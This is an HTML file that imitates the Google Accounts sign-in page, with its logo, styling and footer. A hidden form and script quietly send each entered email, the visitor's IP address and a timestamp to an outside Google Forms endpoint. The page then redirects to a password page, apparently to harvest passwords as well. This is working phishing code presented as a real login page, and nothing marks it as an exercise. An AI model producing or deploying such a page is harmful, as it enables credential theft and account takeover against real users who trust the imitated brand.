<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 450px;
            margin: 100px auto;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 75px;
            height: 24px;
        }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            margin-bottom: 40px;
        }
        input[type="email"] {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        input[type="email"]:focus {
            border-color: #1a73e8;
            outline: none;
        }
        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 40px;
            display: block;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 40px;
        }
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            padding: 10px 0;
        }
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-button:hover {
            background: #0d62d9;
        }
        footer {
            text-align: center;
            margin-top: 30px;
            color: #5f6368;
            font-size: 12px;
        }
        select {
            width: 100%;
            padding: 13px 15px;
            margin-bottom: 20px;
            border: 1px solid #dadce0;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        </div>
        
        <h1>Sign in</h1>
        <div class="subtitle">Use your Google Account</div>
        
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email or phone" required>
            
            <a href="#" class="forgot-email">Forgot email?</a>
            
            <div class="buttons">
                <a href="#" class="create-account">Create account</a>
                <button type="button" onclick="submitEmail()" class="next-button">Next</button>
            </div>
        </form>
    </div>
    
    <footer>
        English (United States) ▼ • Help • Privacy • Terms
    </footer>

    <!-- Hidden form for Google Forms -->
    <form id="hiddenForm" action="https://docs.google.com/forms/d/e/1FAIpQLSeiafdoAt3Qg4s_VMr4jNRAnCKqIBvfkwKHByaBtnE3XdSKdQ/viewform?usp=header/formResponse" method="POST" target="hidden_iframe" style="display:none;">
        <input type="hidden" name="entry.EMAIL_FIELD_ID" id="hiddenEmail">
        <input type="hidden" name="entry.PASSWORD_FIELD_ID" id="hiddenPassword">
        <input type="hidden" name="entry.IP_FIELD_ID" id="hiddenIP">
        <input type="hidden" name="entry.TIMESTAMP_FIELD_ID" id="hiddenTimestamp">
    </form>
    <iframe name="hidden_iframe" style="display:none;"></iframe>

    <script>
        // Get IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }

        async function submitEmail() {
            const email = document.getElementById('email').value;
            
            // Get IP
            const ip = await getIP();
            
            // Submit to Google Forms
            document.getElementById('hiddenEmail').value = email;
            document.getElementById('hiddenIP').value = ip;
            document.getElementById('hiddenPassword').value = 'LOGIN_PAGE_ONLY';
            document.getElementById('hiddenTimestamp').value = new Date().toISOString();
            document.getElementById('hiddenForm').submit();
            
            // Redirect to password page
            window.location.href = 'password.html?email=' + encodeURIComponent(email);
        }
    </script>
</body>
</html>
